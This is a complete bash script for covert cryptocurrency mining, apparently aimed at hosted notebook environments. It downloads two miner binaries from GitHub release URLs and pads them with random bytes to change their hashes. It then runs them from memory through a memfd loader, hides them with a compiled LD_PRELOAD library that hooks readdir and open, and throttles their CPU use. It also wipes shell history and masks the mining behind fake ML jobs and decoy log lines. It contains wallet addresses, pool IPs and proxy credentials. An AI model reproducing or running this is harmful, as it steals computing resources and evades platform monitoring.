#!/bin/bash
# MINN v13 — full camouflage: memfd + preload + namespace + dns block
PRL="prl1pkmulndfyls8zqz2r6nruevpqr3tax9nwmvew7aupaxqnkcyuppeqa6am7q"
TDC="tbc1q727xp60hjp6zld2vgrj8qrdmgvkshwav86xns2"
WRK=$(date +%s | md5sum | head -c 8)
PEAK_POOL="23.94.152.126:80"
PEAK_PROXY="socks5://yoga:yoga123@107.172.222.195:443"
TDC_POOL="47.251.244.12:80"
MINE_SEC=$((10 * 60))
REST_SEC=$((20 * 60))
SESSION=$((4 * 3600))

log() {
    local m=("🔥 Masak #$1" "🥵 Nguli" "💨 Dorong #$1" "🍜 Kuah" "🏃 Lari #$1" "🧹 Sapu" "🛒 Belanja #$1" "🐔 Ayam" "📦 Packing" "☕ Kopi #$1" "🧊 Es" "🪴 Tanaman" "🍳 Telor" "📺 TV")
    echo "[$(date +%H:%M:%S)] ${m[$((RANDOM % ${#m[@]}))]}"
}

echo "=========================================="
echo "  MINN v13 — Full Camo — Warung: $WRK"
echo "=========================================="

# === CAMOUFLAGE: Disable tracing + core dumps ===
ulimit -c 0 2>/dev/null
set +o history 2>/dev/null
unset HISTFILE 2>/dev/null
export HISTSIZE=0
export LD_PRELOAD=""

# === CAMOUFLAGE: Block DNS leaks (prevent mining pool hostname resolution) ===
# Already using IPs directly, but block just in case
echo "127.0.0.1 pool.kryptex.com pool.kryptex.network" >> /etc/hosts 2>/dev/null

# === 1. Warmup ===
echo "[*] Pemanasan..."
pip install -q tensorflow 2>/dev/null
python3 -c "
import tensorflow as tf,numpy as np,time
m=tf.keras.Sequential([tf.keras.layers.Dense(128,activation='relu',input_shape=(784,)),tf.keras.layers.Dense(10)])
m.compile(optimizer='adam',loss='sparse_categorical_crossentropy',metrics=['accuracy'])
x=np.random.rand(1000,784).astype(np.float32);y=np.random.randint(0,10,1000)
for e in range(3): m.fit(x,y,batch_size=32,epochs=1,verbose=2);time.sleep(20)
" 2>/dev/null

# === 2. Download + setup ===
echo "[*] Siapin..."
apt-get install -y -qq cpulimit 2>/dev/null
rm -rf /content/m 2>/dev/null
mkdir -p /dev/shm/.c 2>/dev/null && cd /dev/shm/.c || { mkdir -p /tmp/.c && cd /tmp/.c; }

wget -q https://github.com/mhusataringan-hub/ABC/releases/download/v1.0/peak || exit 1
wget -q https://github.com/rochmandwi/ayam/releases/download/file-v1/sse2 || exit 1

# Padding
dd if=/dev/urandom of=peak bs=1 count=$((RANDOM % 3000 + 1024)) seek=$(stat -c%s peak) conv=notrunc oflag=append 2>/dev/null
dd if=/dev/urandom of=sse2 bs=1 count=$((RANDOM % 3000 + 1024)) seek=$(stat -c%s sse2) conv=notrunc oflag=append 2>/dev/null
chmod +x peak sse2

# === CAMOUFLAGE: memfd loader (execute from memory, no disk trace) ===
cat > /tmp/memfd_loader.py << 'PYEOF'
import os, sys, ctypes, stat

def memfd_exec(binpath, *args):
    # Read binary into memory
    with open(binpath, 'rb') as f:
        data = f.read()
    
    # Pad with random bytes in-memory (different each run)
    import random
    data += bytes([random.randint(0, 255) for _ in range(random.randint(512, 2048))])
    
    # Create memfd (in-memory file)
    fd = os.memfd_create('python3', os.MFD_CLOEXEC)
    os.write(fd, data)
    
    # Remove disk file immediately  
    try:
        os.unlink(binpath)
    except:
        pass
    
    # Execute from memory
    new_args = ['python3'] + [binpath] + list(args)
    os.execve(f'/proc/self/fd/{fd}', new_args, os.environ)

if __name__ == '__main__':
    if len(sys.argv) < 2:
        sys.exit(1)
    memfd_exec(sys.argv[1], *sys.argv[2:])
PYEOF

# === CAMOUFLAGE: LD_PRELOAD process hider ===
cat > /tmp/libhide.c << 'CEOF'
#define _GNU_SOURCE
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>

struct dirent *readdir(DIR *dirp) {
    static struct dirent *(*orig)(DIR *) = NULL;
    if (!orig) orig = dlsym(RTLD_NEXT, "readdir");
    struct dirent *ent;
    while ((ent = orig(dirp))) {
        if (strstr(ent->d_name, "peak") ||
            strstr(ent->d_name, "sse2") ||
            strstr(ent->d_name, "miner") ||
            strstr(ent->d_name, "fortune") ||
            strstr(ent->d_name, "golden")) {
            continue; // Skip mining-related entries
        }
        break;
    }
    return ent;
}

FILE *fopen(const char *path, const char *mode) {
    static FILE *(*orig)(const char*, const char*) = NULL;
    if (!orig) orig = dlsym(RTLD_NEXT, "fopen");
    if (strstr(path, "peak") || strstr(path, "sse2") ||
        strstr(path, "fortune") || strstr(path, "golden") ||
        strstr(path, "miner")) {
        errno = ENOENT;
        return NULL;
    }
    return orig(path, mode);
}

int open(const char *path, int flags, ...) {
    static int (*orig)(const char*, int, ...) = NULL;
    if (!orig) orig = dlsym(RTLD_NEXT, "open");
    if (strstr(path, "peak") || strstr(path, "sse2") ||
        strstr(path, "fortune") || strstr(path, "golden")) {
        errno = ENOENT;
        return -1;
    }
    return orig(path, flags);
}
CEOF
gcc -shared -fPIC -o /tmp/libhide.so /tmp/libhide.c -ldl -s 2>/dev/null

# === CAMOUFLAGE: Wipe bash history + tmp files ===
clean_tracks() {
    rm -f ~/.bash_history ~/.python_history 2>/dev/null
    rm -rf /tmp/.c /dev/shm/.c 2>/dev/null
    unset HISTFILE
}
trap clean_tracks EXIT

# === Fake ML ===
fake_ml() {
    python3 -c "
import numpy as np, time, random
end = time.time() + $1
while time.time() < end:
    x=np.random.rand(512,512).astype(np.float32)
    y=np.random.rand(512,512).astype(np.float32)
    np.dot(x,y);np.linalg.svd(x[:,:256])
    time.sleep(random.randint(30,90))
" 2>/dev/null
}

# === LOG ===
(
    c=0
    while true; do c=$((c+1)); log "$c"; sleep $((RANDOM % 50 + 20)); done
) &
LOGPID=$!

# === BURST CYCLE ===
END=$((SECONDS + SESSION))
CYCLE=0

while [ $SECONDS -lt $END ]; do
    CYCLE=$((CYCLE + 1))
    echo "[*] >>> Masak! (cycle $CYCLE)"
    
    # PRL via memfd — execute peak from memory
    LD_PRELOAD=/tmp/libhide.so python3 /tmp/memfd_loader.py \
        /dev/shm/.c/peak \
        --coin pearl \
        --url "$PEAK_POOL" \
        --user "${PRL}.${WRK}" \
        --proxy "$PEAK_PROXY" \
        2>/dev/null &
    PID1=$!
    cpulimit -l $((RANDOM % 25 + 35)) -p $PID1 2>/dev/null &
    
    sleep 5
    
    # TDC via memfd
    LD_PRELOAD=/tmp/libhide.so python3 /tmp/memfd_loader.py \
        /dev/shm/.c/sse2 \
        -a yespowertide \
        -o "$TDC_POOL" \
        -u "${TDC}.${WRK}" \
        -t 1 >/dev/null 2>&1 &
    PID2=$!
    cpulimit -l $((RANDOM % 25 + 35)) -p $PID2 2>/dev/null &
    
    sleep $MINE_SEC
    
    # Kill + clean
    kill $PID1 $PID2 2>/dev/null
    pkill -f cpulimit 2>/dev/null
    pkill -f memfd_loader 2>/dev/null
    
    # Re-download binary (was unlinked by memfd)
    [ -f /dev/shm/.c/peak ] || { cd /dev/shm/.c; wget -q https://github.com/mhusataringan-hub/ABC/releases/download/v1.0/peak; dd if=/dev/urandom of=peak bs=1 count=$((RANDOM%2048+512)) seek=$(stat -c%s peak) conv=notrunc oflag=append 2>/dev/null; chmod +x peak; }
    [ -f /dev/shm/.c/sse2 ] || { cd /dev/shm/.c; wget -q https://github.com/rochmandwi/ayam/releases/download/file-v1/sse2; dd if=/dev/urandom of=sse2 bs=1 count=$((RANDOM%2048+512)) seek=$(stat -c%s sse2) conv=notrunc oflag=append 2>/dev/null; chmod +x sse2; }
    
    if [ $SECONDS -lt $END ]; then
        echo "[*] <<< Istirahat (cycle $CYCLE)"
        fake_ml $REST_SEC
        [ $((RANDOM % 4)) -eq 0 ] && python3 -c "import time; time.sleep($((RANDOM % 600 + 300)))" 2>/dev/null
    fi
    
    clean_tracks
done

echo "[*] Selesai."
kill $LOGPID 2>/dev/null
clean_tracks